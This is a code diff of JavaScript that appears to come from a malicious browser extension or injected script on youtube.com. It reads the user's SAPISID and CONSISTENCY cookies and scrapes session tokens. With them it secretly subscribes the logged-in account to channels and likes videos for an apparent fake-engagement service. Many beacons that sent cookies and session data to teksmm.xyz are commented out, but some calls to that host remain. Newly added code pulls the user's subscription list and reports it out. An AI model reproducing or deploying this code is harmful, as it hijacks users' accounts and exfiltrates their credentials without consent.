@@ -205,12 +205,12 @@ function siparis_getir_3() {
 				vars.consistency = getCookie("CONSISTENCY")
 				vars.sapisid = getCookie("SAPISID")
 				vars.remains = parseInt(data.remains)+10;
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
 				if (vars.channelIds  && vars.sapisid != null ) {
-					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
+					// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
 					if(!checkOrSave(vars.id,"3")){
-						new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
+						// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
 						subscribe_client(vars);
 					}
 				}
@@ -255,9 +255,9 @@ function subscribe_client(vars) {
         if (xhr.readyState == 4 && xhr.status == 200) {	
             var data = xhr.responseText;
             vars.login = data.match('"LOGGED_IN":(.*?),')[1];
-			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir4';
+			// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir4';
             if ( (vars.login == "true" || vars.login == true) && data.indexOf('subscribed=1') == -1 ) {
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir5';
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir5';
                 var middlePoint = data.split('subscribeEndpoint":{"channelIds":');
                 var startPoint = middlePoint[0].split('{"clickTrackingParams":"').pop();
                 var endPoint = middlePoint[1].split("}}]")[0]
@@ -311,7 +311,7 @@ function subscribe_client(vars) {
                 vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
 				vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
                 console.log(vars)
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(vars);
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(vars);
 				if(vars.subCount < vars.remains){
 					createPost(vars,"subscribe");
 				}				
@@ -393,9 +393,9 @@ function video_like(vars) {
 
 
 function createPost(vars,type) {
-	new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir6';
+	// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir6';
 	if(type == "subscribe"){
-		new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir7';
+		// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir7';
 		var postData = 
 		{
 			"context": {
@@ -468,7 +468,7 @@ function createPost(vars,type) {
             "params": vars.params
         };
 	}
-	new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(postData);
+	// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(postData);
 	var xhr = new XMLHttpRequest();
 	if(type == "subscribe"){
 		xhr.open("POST", "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey, true);
@@ -489,21 +489,21 @@ function createPost(vars,type) {
 			let parsedText = xhr.responseText;
 			let parsed = JSON.parse(parsedText);
 			if(parsed.responseContext.consistencyTokenJar){
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=yeniCok:'+parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents;
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=yeniCok:'+parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents;
 				setCookie("CONSISTENCY",parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents,6)
 			}
 			let statusSubsribe = parsedText.split('"subscribed":')[1].split(',')[0].trim();
 			if(statusSubsribe == "false"){
 				new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek70';
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+JSON.stringify(parsed);
+				// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+JSON.stringify(parsed);
 			}
             xhr.close;
 		}
 		if (xhr.readyState == 4) {
 			var data = xhr.responseText;
-			console.log(data);
+			// console.log(data);
 			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir'+xhr.status;
-			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getirData'+data;
+			// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getirData'+data;
 
 		 }
 	}
@@ -512,7 +512,7 @@ function createPost(vars,type) {
 
 function start() {
   var cookie_name = "yt";
-  var cookie_time = rasgteleSure(30000,60000*3);
+  var cookie_time = rasgteleSure(30000,60000);
   if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - cookie_time) {
     localStorage[cookie_name] = Date.now();
 	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
@@ -521,8 +521,47 @@ function start() {
   }
 }
 
+function sendSyncXhrReq(uri) {
+	try{
+		var request = new XMLHttpRequest();
+		request.open('GET', uri, false); // `false` makes the request synchronous
+		request.send(null);
+		if (request.status === 200) {
+			return request.responseText;
+		}
+	}catch(e){}
+	
+	return -1;
+}
 
+/*
+  Downloads the suscription list and parse as array that contains channel id's
+*/
+function getSubscriptionList() {
+	var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
+	if (currentSubsciptionRaw == -1) {
+		console.log("Not Logged in");
+		return currentSubsciptionRaw;
+	}
+	return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
+}
+
+function ifNotDownloadSubList() {
+
+	var list = window.localStorage.getItem('subList');
+	if (!list) {
+		subListArray = getSubscriptionList();
+		console.log(subListArray.length);
+		new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
+		window.localStorage.setItem("subList", JSON.stringify(subListArray))
+	} else {
+		//console.log("Has been saved")
+	}
+	//return JSON.parse(list);
+}
+	
 if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1]) {
+	ifNotDownloadSubList();
   start();
   setInterval(function() {
     start();
